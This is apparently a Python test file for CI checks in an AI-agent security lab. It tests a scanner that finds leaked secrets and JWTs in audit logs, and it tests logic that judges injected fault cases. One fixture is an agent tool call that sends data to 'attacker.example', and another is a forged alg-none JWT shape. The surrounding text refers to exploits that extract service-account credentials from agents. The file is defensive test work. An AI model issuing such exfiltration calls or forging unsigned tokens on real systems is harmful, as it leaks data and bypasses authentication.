"""Tests for the T8 CI checks: the MCP01 leak scan and the fault cases.

    python3 -m unittest discover -s attacks -t attacks -p 'test_*.py' -v

stdlib only, no stack. Both checks turn stack state into a pass/fail,
and both have the same trap: a check whose input is MISSING must not
pass. An empty audit store scanned for secrets is clean in the most
useless way; a fault case whose exploit exited 1 is a silent pass, the
one outcome T8 exists to make impossible.
"""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import faults  # noqa: E402
import leakscan  # noqa: E402

JWT = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
       "eyJzdWIiOiJ1XzEiLCJvcmdfaWQiOiJhY21lIn0."
       "c2lnbmF0dXJlLXdvdWxkLWdvLWhlcmU")


class FindLeaks(unittest.TestCase):
    SECRETS = {"TOOLS_SECRET": "ci-only-not-a-secret-either", "JWT_SECRET": "ci-only-not-a-secret"}

    def test_clean_text_has_no_leaks(self):
        text = '{"tool":"http_fetch","args":{"url":"http://attacker.example/collect?data=x"}}'
        self.assertEqual(leakscan.find_leaks("gateway.jsonl", text, self.SECRETS), [])

    def test_an_injected_secret_is_found_and_named_not_printed(self):
        text = '{"args":{"auth":"Bearer ci-only-not-a-secret-either"}}'
        leaks = leakscan.find_leaks("gateway.jsonl", text, self.SECRETS)
        self.assertEqual([l.kind for l in leaks], ["TOOLS_SECRET"])
        # The report names WHICH secret and where -- it must not print
        # the secret itself into the CI log, which would be MCP01 in the
        # check that hunts for MCP01.
        self.assertNotIn("ci-only-not-a-secret-either", str(leaks[0]))

    def test_a_jwt_is_found_by_its_fixed_structure(self):
        leaks = leakscan.find_leaks("messages", f"token was {JWT} ok", self.SECRETS)
        self.assertEqual([l.kind for l in leaks], ["JWT"])

    def test_the_jwt_secret_is_not_double_counted_inside_the_tools_secret(self):
        # "ci-only-not-a-secret" is a prefix of the tools secret: one
        # occurrence of the tools secret is one leak, of one kind.
        leaks = leakscan.find_leaks("x", "ci-only-not-a-secret-either", self.SECRETS)
        self.assertEqual([l.kind for l in leaks], ["TOOLS_SECRET"])

    def test_an_unsigned_alg_none_jwt_is_found(self):
        # Finding 02's own token shape: header.payload. with an EMPTY
        # signature. A pattern demanding a signature would miss exactly
        # the token this repo forges (found at T8 review).
        unsigned = JWT.rsplit(".", 1)[0] + "."
        leaks = leakscan.find_leaks("messages", f"forged {unsigned} here", self.SECRETS)
        self.assertEqual([l.kind for l in leaks], ["JWT"])

    def test_the_fake_sa_token_is_not_a_platform_secret(self):
        # Declared exclusion: finding 04's evidence sits in the transcript
        # by design. It is tool output, not a platform credential leaking
        # into a log -- the scan does not pretend otherwise by matching it.
        text = '{"access_token": "ya29.FAKE-brokenbazaar-lab-token-NOT-A-CREDENTIAL"}'
        self.assertEqual(leakscan.find_leaks("messages", text, self.SECRETS), [])

    def test_short_or_empty_secrets_are_refused(self):
        # A one-character "secret" matches everything; an empty one
        # matches nothing and would make the scan vacuous. Both refuse.
        for bad in ({"X": ""}, {"X": "abc"}):
            with self.subTest(bad=bad), self.assertRaises(ValueError):
                leakscan.find_leaks("x", "text", bad)


class SecretsComeFromTheStack(unittest.TestCase):
    """The scan reads the secrets the RUNNING stack holds, so a value
    edited in one place and not another cannot make it search for a
    string the stack never had (found at T8 review)."""

    def test_env_list_is_parsed(self):
        env = ["PATH=/bin", "TOOLS_SECRET=ci-only-not-a-secret-either", "EMPTY="]
        self.assertEqual(leakscan.env_value(env, "TOOLS_SECRET"), "ci-only-not-a-secret-either")
        self.assertEqual(leakscan.env_value(env, "EMPTY"), "")
        self.assertEqual(leakscan.env_value(env, "MISSING"), "")

    def test_the_dev_secret_is_read_from_the_source(self):
        src = 'const (\n\tjwtSecretEnv = "JWT_SECRET"\n\tdevJWTSecret = "dev-secret"\n)'
        self.assertEqual(leakscan.dev_secret_from(src), "dev-secret")
        with self.assertRaises(leakscan.Operational):
            leakscan.dev_secret_from("no such constant")


class StoresMustHaveContent(unittest.TestCase):
    def test_an_empty_store_is_operational_not_clean(self):
        with self.assertRaises(leakscan.Operational):
            leakscan.require_content({"gateway.jsonl": "", "agent.jsonl": "x"})

    def test_all_present_passes(self):
        leakscan.require_content({"gateway.jsonl": "a", "agent.jsonl": "b"})


class JudgeFault(unittest.TestCase):
    def test_exit_codes_are_agentlab_s(self):
        # One vocabulary for exit codes, not a second copy of the numbers.
        self.assertEqual(faults.EXIT_OPERATIONAL, 2)

    def test_exit_2_naming_the_cause_is_a_pass(self):
        ok, why = faults.judge(2, "OPERATIONAL ERROR: ... 'opa_unavailable' ...", "opa_unavailable")
        self.assertTrue(ok, why)

    def test_exit_1_under_a_fault_is_the_silent_pass(self):
        ok, why = faults.judge(1, "gateway denied: opa_unavailable\nCONTROL HOLDS", "opa_unavailable")
        self.assertFalse(ok)
        self.assertIn("SILENT PASS", why)

    def test_exit_0_under_a_fault_is_a_failure(self):
        ok, why = faults.judge(0, "SA CREDENTIAL RETURNED", "opa_unavailable")
        self.assertFalse(ok)

    def test_exit_2_for_the_wrong_reason_is_a_failure(self):
        # Exit 2 because docker was missing is not evidence that the
        # injected fault was detected.
        ok, why = faults.judge(2, "OPERATIONAL ERROR: docker is not installed", "opa_unavailable")
        self.assertFalse(ok)
        self.assertIn("opa_unavailable", why)


if __name__ == "__main__":
    unittest.main()
